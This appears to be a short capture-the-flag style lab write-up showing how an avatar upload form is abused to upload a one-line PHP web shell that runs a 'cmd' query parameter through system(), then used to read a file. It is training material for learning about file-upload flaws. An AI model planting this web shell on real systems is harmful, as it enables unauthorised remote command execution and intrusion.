---
title: Remote code execution via web shell upload
category: File upload vulnerabilities
difficulty: Apprentice
tags:
  - insecure-design
  - file-upload
  - rce
---
The goal is to exploit the avatar upload functionality to upload a web shell and read a specific file.

After logging in, we can upload a new avatar:
![[remote-code-execution-via-web-shell-upload-img1.png]]

Instead of uploading an image, we can try sending a simple PHP web shell:
```php
<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>`)
```
![[remote-code-execution-via-web-shell-upload-img2.png]]

The upload seems to have worked. Let's see if the shell actually works:
![[remote-code-execution-via-web-shell-upload-img3.png]]

The shell does work, so the final step is to use it to read the required file and solve the lab.